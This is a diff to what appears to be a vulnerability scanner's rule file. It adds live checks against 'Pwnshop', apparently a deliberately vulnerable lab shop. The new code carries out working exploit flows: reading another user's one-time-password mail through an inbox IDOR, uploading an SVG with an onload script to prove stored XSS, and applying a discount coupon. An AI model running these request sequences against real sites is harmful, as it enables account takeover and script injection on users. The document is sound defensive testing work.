@@ -26199,6 +26199,195 @@ async function pwnshopRegisterAndLoginCookie(ctx: RuleContext): Promise<string |
   return pwnshopSessionCookieFromDoc(loginDoc) ?? registerCookie;
 }
 
+function pwnshopMailTokenFromRedirect(location: string): string | null {
+  const m = location.match(/\/mail\/([a-f0-9]{32})/i);
+  return m?.[1] ?? null;
+}
+
+function pwnshopOtpFromMailBody(body: string): string | null {
+  const m = body.match(/one-time verification code is:\s*(\d{6})/i);
+  return m?.[1] ?? null;
+}
+
+async function pwnshopMailInboxToken(ctx: RuleContext, cookie: string): Promise<string | null> {
+  const mailUrl = new URL("/mail", ctx.origin).toString();
+  const doc = await ctx.probe.get(mailUrl, {
+    maxBytes: 2048,
+    timeoutMs: 15000,
+    redirect: "manual",
+    headers: { Cookie: cookie }
+  });
+  return pwnshopMailTokenFromRedirect(doc.headers["location"] || "");
+}
+
+async function pwnshopOtpFromMailInbox(
+  ctx: RuleContext,
+  cookie: string,
+  inboxToken: string
+): Promise<string | null> {
+  const mailUrl = new URL(`/mail/${inboxToken}`, ctx.origin).toString();
+  const doc = await ctx.probe.get(mailUrl, {
+    maxBytes: 16384,
+    timeoutMs: 15000,
+    headers: { Cookie: cookie }
+  });
+  if (doc.status < 200 || doc.status >= 400) return null;
+  return pwnshopOtpFromMailBody(doc.body);
+}
+
+async function pwnshopCompleteOtpSession(ctx: RuleContext): Promise<string | null> {
+  const cookie = await pwnshopRegisterAndLoginCookie(ctx);
+  if (!cookie) return null;
+  const inboxToken = await pwnshopMailInboxToken(ctx, cookie);
+  if (!inboxToken) return null;
+  const otp = await pwnshopOtpFromMailInbox(ctx, cookie, inboxToken);
+  if (!otp) return null;
+  const verifyDoc = await ctx.probe.get(new URL("/verify-otp", ctx.origin).toString(), {
+    method: "POST",
+    body: `otp=${otp}`,
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Cookie: cookie
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  if (![301, 302, 303, 307, 308].includes(verifyDoc.status)) return null;
+  const location = verifyDoc.headers["location"] || "";
+  if (!location || /verify-otp/i.test(location)) return null;
+  return pwnshopSessionCookieFromDoc(verifyDoc) ?? cookie;
+}
+
+const pwnshopMailInboxIdorLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const victimUser = `thugir_victim_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  const victimEmail = `${victimUser}@probe.local`;
+  const victimRegister = await ctx.probe.get(new URL("/register", ctx.origin).toString(), {
+    method: "POST",
+    body: `username=${encodeURIComponent(victimUser)}&email=${encodeURIComponent(victimEmail)}&password=ThugirTest123!`,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  const victimCookie = pwnshopSessionCookieFromDoc(victimRegister);
+  if (!victimCookie) return NEGATIVE;
+  await ctx.probe.get(new URL("/login", ctx.origin).toString(), {
+    method: "POST",
+    body: `username=${encodeURIComponent(victimUser)}&password=ThugirTest123!`,
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Cookie: victimCookie
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  const victimInboxToken = await pwnshopMailInboxToken(ctx, victimCookie);
+  if (!victimInboxToken) return NEGATIVE;
+  const attackerCookie = await pwnshopCompleteOtpSession(ctx);
+  if (!attackerCookie) return NEGATIVE;
+  const idorUrl = new URL(`/mail/${victimInboxToken}`, ctx.origin).toString();
+  const idorDoc = await ctx.probe.get(idorUrl, {
+    maxBytes: 16384,
+    timeoutMs: 15000,
+    headers: { Cookie: attackerCookie }
+  });
+  if (idorDoc.status < 200 || idorDoc.status >= 400) return NEGATIVE;
+  if (!/Your Pwnshop Login Code/i.test(idorDoc.body)) return NEGATIVE;
+  if (!new RegExp(`Hi\\s+${victimUser.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}`, "i").test(idorDoc.body)) {
+    return NEGATIVE;
+  }
+  const otpMatch = idorDoc.body.match(/one-time verification code is:\s*(\d{6})/i);
+  if (!otpMatch) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      victimUser,
+      victimInboxToken,
+      idorUrl,
+      victimOtpSnippet: otpMatch[0].slice(0, 80),
+      note: "Pwnshop GET /mail/<inbox_token> returns another user's OTP mail without ownership check — PwnMail inbox IDOR (PWN-004)"
+    }
+  };
+};
+
+const pwnshopAvatarSvgXssLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const cookie = await pwnshopCompleteOtpSession(ctx);
+  if (!cookie) return NEGATIVE;
+  const uploadUrl = new URL("/profile/upload-avatar", ctx.origin).toString();
+  const svgPayload = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>';
+  const boundary = `----ThugirPwnshopSvg${Date.now().toString(36)}`;
+  const body = [
+    `--${boundary}`,
+    'Content-Disposition: form-data; name="avatar"; filename="thugir-probe.svg"',
+    "Content-Type: image/svg+xml",
+    "",
+    svgPayload,
+    `--${boundary}--`,
+    ""
+  ].join("\r\n");
+  const uploadDoc = await ctx.probe.get(uploadUrl, {
+    method: "POST",
+    body,
+    headers: {
+      "Content-Type": `multipart/form-data; boundary=${boundary}`,
+      Cookie: cookie
+    },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (uploadDoc.status < 200 || uploadDoc.status >= 300) return NEGATIVE;
+  const uploadMatch = uploadDoc.body.match(/"url"\s*:\s*"(\/uploads\/[^"]+)"/);
+  if (!uploadMatch) return NEGATIVE;
+  const servedUrl = new URL(uploadMatch[1], ctx.origin).toString();
+  const servedDoc = await ctx.probe.get(servedUrl, { maxBytes: 4096, timeoutMs: 15000 });
+  if (servedDoc.status < 200 || servedDoc.status >= 400) return NEGATIVE;
+  if (!/onload\s*=\s*["']alert\(1\)["']/i.test(servedDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      uploadUrl,
+      servedUrl,
+      snippet: servedDoc.body.slice(0, 160).trim(),
+      note: "Pwnshop POST /profile/upload-avatar stores SVG with onload handler served at /uploads/ — stored XSS via avatar upload (PWN-012)"
+    }
+  };
+};
+
+const pwnshopApplyCouponLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const cookie = await pwnshopCompleteOtpSession(ctx);
+  if (!cookie) return NEGATIVE;
+  const couponUrl = new URL("/apply-coupon", ctx.origin).toString();
+  const couponDoc = await ctx.probe.get(couponUrl, {
+    method: "POST",
+    body: "code=HALFOFF",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Cookie: cookie
+    },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (couponDoc.status < 200 || couponDoc.status >= 300) return NEGATIVE;
+  if (!/"valid"\s*:\s*true/i.test(couponDoc.body)) return NEGATIVE;
+  if (!/"discount_percent"\s*:\s*50/.test(couponDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url: couponUrl,
+      code: "HALFOFF",
+      snippet: couponDoc.body.slice(0, 200).trim(),
+      note: "Pwnshop POST /apply-coupon accepts HALFOFF after OTP login and returns valid:true with 50% discount — authenticated coupon application oracle (PWN-016 family)"
+    }
+  };
+};
+
 const pwnshopVerifyOtpBruteforceLiveOracle: Rule = async (ctx) => {
   if (!isPwnshopHost(ctx)) return NEGATIVE;
   const cookie = await pwnshopRegisterAndLoginCookie(ctx);
@@ -36405,6 +36594,9 @@ export const RULES: Record<string, Rule> = {
   pwnshopMassAssignmentAdminLiveOracle,
   pwnshopOpenRedirectRegisterLiveOracle,
   pwnshopVerifyOtpBruteforceLiveOracle,
+  pwnshopMailInboxIdorLiveOracle,
+  pwnshopAvatarSvgXssLiveOracle,
+  pwnshopApplyCouponLiveOracle,
   brokencrystalsUserloginCssInjectionLiveOracle,
   clientSideVulnforgeAcademyEvidence,
   clientSideVulnforgeEvidence,
